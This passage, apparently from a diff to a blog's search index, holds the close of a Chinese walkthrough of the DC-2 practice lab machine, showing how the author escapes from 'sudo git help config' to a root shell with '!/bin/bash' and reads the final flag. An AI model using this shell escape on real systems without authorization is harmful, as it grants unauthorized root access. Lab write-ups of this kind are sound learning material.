+<p>我们可以发现sudo是具有suid的权限的，所以就用sudo -l命令来看看有哪些是具有sudo权限的</p>
+<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-2%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A324.png"></p>
+<p>发现有git可以直接切换到root权限</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd</span><br><span class="line">sudo git help config</span><br><span class="line">!/bin/bash               //在末行模式输入</span><br></pre></td></tr></table></figure>
+
+<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-2%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A325-169010424697916.png"></p>
+<p>可以看到，成功拿到了root权限，但是我们的目录退到了jerry目录下，再次cd</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd</span><br><span class="line">ls</span><br><span class="line">cat final-flag.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/DC1-2%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0.assets/DC-2%E9%9D%B6%E6%9C%BA%E7%A0%B4%E8%A7%A326.png"></p>
+]]></content>
+  </entry>
 </search>
